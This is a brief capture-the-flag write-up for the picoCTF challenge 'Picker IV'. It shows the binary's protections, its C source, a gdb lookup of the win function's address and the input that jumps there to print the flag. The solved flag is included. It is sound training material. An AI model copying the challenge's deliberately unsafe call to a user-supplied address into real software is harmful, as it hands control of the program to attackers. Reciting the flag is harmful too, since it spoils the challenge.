# Writeup: Picker IV


## Introduction

Right off of the bat we can see that obtaining this flag is straight forward. All we need to do is to figure out the address of the win function and then pass it into the input so that we can jump to it and obtain the flag. The first thing I did was use checksec to see what kind of restrictions the binary has.

```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
    Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               1              ./picker-IV
```
## Relevant Source Code

```
   int win() {
      FILE *fptr;
      char c;

      printf("You won!\n");
      // Open file
      fptr = fopen("flag.txt", "r");
      if (fptr == NULL)
      {
          printf("Cannot open file.\n");
          exit(0);
      }

      // Read contents from file
      c = fgetc(fptr);
      while (c != EOF)
      {
          printf ("%c", c);
          c = fgetc(fptr);
      }

      printf("\n");
      fclose(fptr);
    }

 
```

```
    int main() {
      signal(SIGSEGV, print_segf_message);
      setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

      unsigned int val;
      printf("Enter the address in hex to jump to, excluding '0x': ");
      scanf("%x", &val);
      printf("You input 0x%x\n", val);

      void (*foo)(void) = (void (*)())val;
      foo();
    }
```

## Results

Since there is no PIE that means that the addresses are consistent across runs meaning we can use gdb to give us the address of the win function.

```
    gef➤  p win
    $1 = {<text variable, no debug info>} 0x40129e <win>
```

Finally we can pass this into the input and we should have our flag.

```
    Enter the address in hex to jump to, excluding '0x': 40129e
    You input 0x40129e
    You won!
    picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444} 
```
Finally we have our flag!

